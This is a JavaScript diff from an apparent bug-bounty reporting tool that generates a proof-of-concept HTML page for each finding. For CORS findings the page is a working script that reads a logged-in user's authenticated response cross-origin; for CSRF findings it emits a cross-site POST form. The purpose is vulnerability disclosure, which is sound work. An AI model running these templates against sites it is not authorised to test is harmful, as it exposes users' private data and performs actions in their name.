@@ -7000,8 +7000,91 @@ function ckBuildPocSummary(focus) {
   return L.join("\n");
 }
 
-// One-click PoC bundle: report + PoC/evidence summary + every captured screenshot + the finding
-// JSON, zipped in the browser. Works for any finding (board / campaign / history) with no run.
+// A self-contained, class-aware PoC web page for the zip. For a browser-exploitable class it
+// carries a REAL, one-click demonstration (nothing runs until the operator clicks) — most
+// importantly a CORS PoC that fetches the target with credentials and shows the authenticated
+// response read cross-origin, the exact "working PoC" a triager asks for. Everything is escaped;
+// the target URL is embedded as a JSON string literal so it can't break out of the script.
+function ckBuildPocHtml(focus) {
+  const esc = escapeHtml;
+  const j = (s) => JSON.stringify(String(s == null ? "" : s));
+  const cls = String(focus.class_id || "").toLowerCase();
+  const url = String(focus.location || focus.target || "");
+  const plan = focus.plan || {};
+  const po = focus.proofObj || {};
+
+  let note = "", runnable = "";
+  if (cls === "cors") {
+    note = "Host this file on ANY origin you control (NOT the target). Open it in a browser that is logged in to the target, then click Run. If the target's authenticated response body appears below, a foreign origin read it — that is the exploit HackerOne wants demonstrated.";
+    runnable = [
+      '<div class="run"><button id="gx-run" type="button" class="btn">▶ Run PoC — read the target cross-origin</button>',
+      '<pre id="gx-out" class="out">Served from this page’s origin. Click Run to fetch the target with credentials.</pre></div>',
+      '<script>(function(){var TARGET=' + j(url) + ';var b=document.getElementById("gx-run"),o=document.getElementById("gx-out");',
+      'b.addEventListener("click",function(){o.textContent="Fetching "+TARGET+" with credentials from origin "+location.origin+" …";',
+      'fetch(TARGET,{credentials:"include",mode:"cors"}).then(function(r){return r.text().then(function(t){return {s:r.status,t:t};});})',
+      '.then(function(x){o.textContent="PROVED — "+location.origin+" read the authenticated response cross-origin.\\nHTTP "+x.s+" — "+x.t.length+" bytes of sensitive data:\\n\\n"+x.t.slice(0,6000);})',
+      '.catch(function(e){o.textContent="No cross-origin read (the browser blocked it): "+e;});});})();</script>',
+    ].join("");
+  } else if (cls === "csrf") {
+    note = "Opened from a foreign origin with the victim's session, this cross-site POST performs the action with no anti-CSRF token. Add the state-changing parameters the action needs, then submit.";
+    runnable = '<form class="run" action="' + esc(url) + '" method="POST" target="_blank"><input name="example" value="change-me"><button type="submit" class="btn">▶ Submit cross-site request</button></form>';
+  } else if (cls === "redirect" || cls === "xss") {
+    note = cls === "xss"
+      ? "Open the URL — for a reflected XSS the marker payload executes in the target's page. (Stored XSS: view the page where it was stored.)"
+      : "Follow the link — if the browser lands on the external host, the open redirect is confirmed.";
+    runnable = '<div class="run"><a class="btn" href="' + esc(url) + '" target="_blank" rel="noopener noreferrer">▶ Open the crafted URL</a></div>';
+  } else {
+    note = "This class has no safe one-click browser PoC. Reproduce with the request below and capture the response — the Response source screenshot already shows the served proof.";
+    const repro = String(po.evidence || (Array.isArray(plan.steps) && plan.steps[0]) || plan.poc || ("GET " + url));
+    runnable = '<pre class="out">' + esc(repro) + '</pre>';
+  }
+
+  const section = (h, inner) => inner ? `<section><h2>${esc(h)}</h2>${inner}</section>` : "";
+  const stepsHtml = (Array.isArray(plan.steps) && plan.steps.length)
+    ? section("Steps to reproduce", "<ol>" + plan.steps.map((s) => `<li>${esc(s)}</li>`).join("") + "</ol>") : "";
+  const pocHtml = plan.poc ? section("PoC outline", `<pre>${esc(String(plan.poc))}</pre>`) : "";
+  let poiHtml = "";
+  if (po.observed_result || po.control_result || po.evidence || po.proof_obligation) {
+    const row = (k, v) => v ? `<div><b>${esc(k)}:</b> ${esc(String(v))}</div>` : "";
+    poiHtml = section("Proof of impact", row("Status", po.status) + row("Observed", po.observed_result)
+      + row("Control", po.control_result) + row("Evidence", po.evidence)
+      + (po.status !== "confirmed" ? row("To confirm", po.proof_obligation) : ""));
+  }
+  const shots = [];
+  if (focus.screenshot && focus.screenshot.data_url) shots.push(focus.screenshot);
+  for (const s of (focus.shots || [])) if (s && s.data_url) shots.push(s);
+  const shotsHtml = shots.length ? section("Screenshots",
+    shots.map((s) => `<figure><figcaption>${esc(s.kind || "screenshot")}</figcaption><img src="${s.data_url}" alt="proof screenshot"></figure>`).join("")) : "";
+
+  const cvss = focus.cvss && focus.cvss.vector
+    ? `${esc(focus.cvss.vector)}${focus.cvssScore != null ? ` (${Number(focus.cvssScore).toFixed(1)})` : ""}` : "";
+  return [
+    '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">',
+    `<title>PoC — ${esc(focus.title)}</title><style>`,
+    "body{margin:0;font:14px/1.55 system-ui,Segoe UI,Roboto,sans-serif;background:#0b1020;color:#e6edf3}",
+    "h1{font-size:18px;margin:16px}h2{font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:#8aa0c6;margin:0 0 8px}",
+    "section{padding:12px 16px;border-top:1px solid #1e2a44}.meta{margin:0 16px 6px;color:#b6c2da}",
+    "code,pre{font-family:ui-monospace,Consolas,monospace}pre{white-space:pre-wrap;word-break:break-word;background:#111a2e;border:1px solid #1e2a44;border-radius:8px;padding:10px}",
+    ".warn{background:#3a2a08;color:#ffd98a;padding:10px 16px;border-bottom:2px solid #f0a500;font-size:13px}",
+    ".btn{display:inline-block;background:#f0a500;color:#111;border:0;border-radius:8px;padding:9px 14px;font:inherit;font-weight:600;cursor:pointer;text-decoration:none}",
+    ".out{margin-top:10px;min-height:2em}.note{color:#b6c2da;margin:0 0 10px}.sev{background:#7a1020;color:#fff;border-radius:5px;padding:1px 7px;font-weight:700;font-size:12px}",
+    "figure{margin:0 0 12px}figcaption{color:#8aa0c6;font-size:12px;margin-bottom:4px}img{max-width:100%;border:1px solid #1e2a44;border-radius:8px}",
+    "footer{padding:14px 16px;color:#7a88a6;font-size:12px}</style></head><body>",
+    '<div class="warn">⚠ Authorized security testing only — run this against a target you are permitted to test. Nothing executes until you click Run.</div>',
+    `<h1>${esc(focus.title)}</h1>`,
+    `<div class="meta"><span class="sev">${esc(String(focus.severity || "info").toUpperCase())}</span> ${esc(focus.className || "")}${focus.cwe ? " · " + esc(focus.cwe) : ""}</div>`,
+    `<div class="meta">Target: <code>${esc(url)}</code></div>`,
+    cvss ? `<div class="meta">CVSS: <code>${cvss}</code></div>` : "",
+    section("Live proof of concept", (note ? `<p class="note">${esc(note)}</p>` : "") + runnable),
+    stepsHtml, pocHtml, poiHtml, shotsHtml,
+    "<footer>Generated by GreyIQ BugHunter. Screenshots and responses are NOT auto-redacted — review before sharing.</footer>",
+    "</body></html>",
+  ].join("");
+}
+
+// One-click PoC bundle: report + PoC/evidence summary + a runnable PoC web page + every captured
+// screenshot + the finding JSON, zipped in the browser. Works for any finding (board / campaign /
+// history) with no run.
 async function ckDownloadPocZip(focus, btn) {
   const old = btn.textContent; btn.disabled = true; btn.textContent = "Zipping…";
   try {
@@ -7010,6 +7093,7 @@ async function ckDownloadPocZip(focus, btn) {
     const pkg = await ckFullReportMarkdown(focus);
     files.push({ name: "report.md", data: enc.encode(pkg.text || "") });
     files.push({ name: "poc.md", data: enc.encode(ckBuildPocSummary(focus)) });
+    files.push({ name: "poc.html", data: enc.encode(ckBuildPocHtml(focus)) });
     const shots = [];
     if (focus.screenshot && focus.screenshot.data_url) shots.push({ data_url: focus.screenshot.data_url, kind: "evidence", path: "" });
     for (const s of (focus.shots || [])) if (s && s.data_url) shots.push(s);
